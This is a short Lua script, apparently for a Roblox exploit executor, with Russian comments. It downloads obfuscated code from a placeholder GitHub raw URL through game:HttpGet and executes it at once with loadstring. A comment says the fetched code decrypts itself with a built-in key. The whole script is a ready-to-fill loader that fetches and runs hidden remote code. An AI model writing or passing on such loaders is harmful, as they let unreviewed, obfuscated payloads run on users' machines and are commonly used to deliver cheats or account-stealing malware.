local payload_url = "ВАША_RAW_ССЫЛКА_С_GITHUB_НАЧИНАЮЩАЯСЯ_С_https://raw.githubusercontent.com/..." 

local success, obfuscated_code = pcall(function()
    return game:HttpGet(payload_url, true)
end)

if success and obfuscated_code then
    loadstring(obfuscated_code)() -- Эта команда запустит весь ваш огромный код, который сам себя расшифрует ключом "Gemini2025".
end
